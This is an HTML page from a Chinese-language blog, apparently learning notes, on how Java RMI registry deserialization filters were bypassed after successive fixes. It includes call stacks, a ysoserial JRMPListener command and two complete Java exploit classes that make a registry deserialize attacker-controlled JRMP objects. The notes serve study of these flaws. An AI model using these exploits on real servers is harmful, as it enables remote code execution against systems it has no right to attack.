@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+
+    
+
+    
+<div class="hd posts">
+
+    <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a>
+    <div class="post-title">
+        <p>
+            RMI反序列化学习笔记(3): 绕过手法
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://halfblue.github.io/2021/11/03/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-JEP290%E7%BB%95%E8%BF%87/">https://halfblue.github.io/2021/11/03/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-JEP290%E7%BB%95%E8%BF%87/</a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以下的修复全部都是针对前述攻击手法中的<code>lookup bind 攻击注册中心</code>，因为这个相比于其他更容易利用：只要开放了服务即可被利用。method hash那个利用条件是知道远程接口的参数类型且类型不为基础类型；服务端攻击客户端场景不常见。</p>
+<h1 id="第一次修复与绕过"><a href="#第一次修复与绕过" class="headerlink" title="第一次修复与绕过"></a>第一次修复与绕过</h1><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>在<code>RegistryImpl_Skel</code>中配置了白名单，也就是说lookup和bind传过去的对象只能是白名单里的。</p>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>调用栈</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Reigstry_Skel#dispatch</span><br><span class="line">	// 1. readObject </span><br><span class="line">        UnicastRef#readExternal</span><br><span class="line">            LiveRef#read</span><br><span class="line">                ConnectionInputStream#saveRef</span><br><span class="line">                    //修改incomingRefTable，使之不为空</span><br><span class="line">	// 2.releaseInputStream</span><br><span class="line">    StreamRemoteCall#releaseInputStream //有个if，需要incomingRefTable不为空才能进入</span><br><span class="line">        ConnectionInputStream#registerRefs</span><br><span class="line">            DGCClient#registerRefs</span><br><span class="line">            	DGCClient$EndPointEntry#lookup</span><br><span class="line">            		DGCClient$EndPointEntry 构造函数</span><br><span class="line">            			RenewCleanThread#run</span><br><span class="line">                            makeDirtyCall</span><br><span class="line">                                DGCImpl_Stub#dirty</span><br><span class="line">                                    readObject</span><br></pre></td></tr></table></figure>
+
+<p>监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections6 calc</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class JRMPRegistryExploit &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);</span><br><span class="line">        lookup(registry);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void lookup(RegistryImpl_Stub registry) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Class RemoteObjectClass = registry.getClass().getSuperclass().getSuperclass();</span><br><span class="line">        Field refField = RemoteObjectClass.getDeclaredField(&quot;ref&quot;);</span><br><span class="line">        refField.setAccessible(true);</span><br><span class="line">        UnicastRef ref = (UnicastRef) refField.get(registry);</span><br><span class="line"></span><br><span class="line">        Operation[] operations = new Operation[]&#123;new Operation(&quot;void bind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;java.lang.String list()[]&quot;), new Operation(&quot;java.rmi.Remote lookup(java.lang.String)&quot;), new Operation(&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;void unbind(java.lang.String)&quot;)&#125;;</span><br><span class="line"></span><br><span class="line">        RemoteCall var2 = ref.newCall(registry, operations, 2, 4905912898345647071L);</span><br><span class="line"></span><br><span class="line">        ObjectOutput var3 = var2.getOutputStream();</span><br><span class="line"></span><br><span class="line">        var3.writeObject(genEvilJRMPObj());</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    private static Object genEvilJRMPObj() &#123;</span><br><span class="line">        LiveRef liveRef = new LiveRef(new ObjID(), new TCPEndpoint(&quot;127.0.0.1&quot;, 7777), false);</span><br><span class="line">        UnicastRef unicastRef = new UnicastRef(liveRef);</span><br><span class="line">        return unicastRef;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="第二次修复与绕过"><a href="#第二次修复与绕过" class="headerlink" title="第二次修复与绕过"></a>第二次修复与绕过</h1><h2 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h2><p>第一处</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Reigstry_Skel#dispatch</span><br><span class="line">	// readObject 这个方法一定会触发异常，所以在catch处清空incomingRefTable，使之为空。</span><br><span class="line">		UnicastRef#readExternal</span><br><span class="line">			...</span><br></pre></td></tr></table></figure>
+
+<p>第二处</p>
+<pre><code>DGCImpl_Stub#dirty
+    readObject //在这里添加了过滤
+</code></pre>
+<h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h2><blockquote>
+<p>而如果想实现攻击，要满足几个条件：<br>1、找到一处不受限制的反序列化<br>2、白名单类可以通过反序列化触发上述不受限的反序列化<br>3、触发点就在readObject中</p>
+</blockquote>
+<p>调用栈</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Reigstry_Skel#dispatch</span><br><span class="line">    UnicastRemoteObject#readObject</span><br><span class="line">        reexport</span><br><span class="line">            ...</span><br><span class="line">                TCPTransport#listen</span><br><span class="line">                    TCPEndPoint#newServerSocket</span><br><span class="line">                        RemoteObjectInvocationHandler#invoke</span><br><span class="line">                            UnicastRef#invoke</span><br><span class="line">                                executeCall</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class UnicastRemoteObjectExploit &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);</span><br><span class="line">        exploit(registry,&quot;127.0.0.1&quot;,7777);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void exploit(RegistryImpl_Stub registry,String host,int port) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        UnicastRemoteObject unicastRemoteObject = getObj(host,port);</span><br><span class="line">        Class RemoteObjectClass = registry.getClass().getSuperclass().getSuperclass();</span><br><span class="line">        Field refField = RemoteObjectClass.getDeclaredField(&quot;ref&quot;);</span><br><span class="line">        refField.setAccessible(true);</span><br><span class="line">        UnicastRef ref = (UnicastRef) refField.get(registry);</span><br><span class="line"></span><br><span class="line">        Operation[] operations = new Operation[]&#123;new Operation(&quot;void bind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;java.lang.String list()[]&quot;), new Operation(&quot;java.rmi.Remote lookup(java.lang.String)&quot;), new Operation(&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;void unbind(java.lang.String)&quot;)&#125;;</span><br><span class="line"></span><br><span class="line">        RemoteCall var2 = ref.newCall(registry, operations, 2, 4905912898345647071L);</span><br><span class="line"></span><br><span class="line">        ObjectOutput var3 = var2.getOutputStream();</span><br><span class="line"></span><br><span class="line">        Field f = ObjectOutputStream.class.getDeclaredField( &quot;enableReplace&quot; );</span><br><span class="line">        f.setAccessible( true );</span><br><span class="line">        f.set( var3, false );</span><br><span class="line"></span><br><span class="line">        var3.writeObject(unicastRemoteObject);</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static UnicastRemoteObject getObj(String host,int port) throws  Exception&#123;</span><br><span class="line">        LiveRef liveRef = new LiveRef(new ObjID(7777), new TCPEndpoint(host,port), false);</span><br><span class="line">        UnicastRef ref = new UnicastRef(liveRef);</span><br><span class="line">        RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler(ref);</span><br><span class="line">        RMIServerSocketFactory rmiServerSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(RMIServerSocketFactory.class.getClassLoader(),</span><br><span class="line">                new Class[]&#123;RMIServerSocketFactory.class, Remote.class&#125;,remoteObjectInvocationHandler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        Constructor RemoteObjectConstructor = RemoteObject.class.getDeclaredConstructor(RemoteRef.class);</span><br><span class="line">        RemoteObjectConstructor.setAccessible(true);</span><br><span class="line">        Constructor&lt;?&gt; unicastRemoteObjectConstructor = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(UnicastRemoteObject.class, RemoteObjectConstructor);</span><br><span class="line">        UnicastRemoteObject unicastRemoteObject = (UnicastRemoteObject) unicastRemoteObjectConstructor.newInstance(new UnicastRef(liveRef));</span><br><span class="line"></span><br><span class="line">        Field ssfField = unicastRemoteObject.getClass().getDeclaredField(&quot;ssf&quot;);</span><br><span class="line">        ssfField.setAccessible(true);</span><br><span class="line">        ssfField.set(unicastRemoteObject,rmiServerSocketFactory);</span><br><span class="line">        return unicastRemoteObject;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections6 calc</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="最后修复"><a href="#最后修复" class="headerlink" title="最后修复"></a>最后修复</h1><p>第一处</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Reigstry_Skel#dispatch</span><br><span class="line">	//这里的readObject变成了readString</span><br></pre></td></tr></table></figure>
+
+<p>第二处</p>
+<p>UnicastRef#unmarshalValue</p>
+<p>修复之前String类型也是readObject，修复后则变成readString了。</p>
+<p>此时攻击服务端的唯一手段就是知道远程接口的参数类型，且类型不为基础类型和String。</p>
+
+    </div>
+
+    
+
+
+</div>
+
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
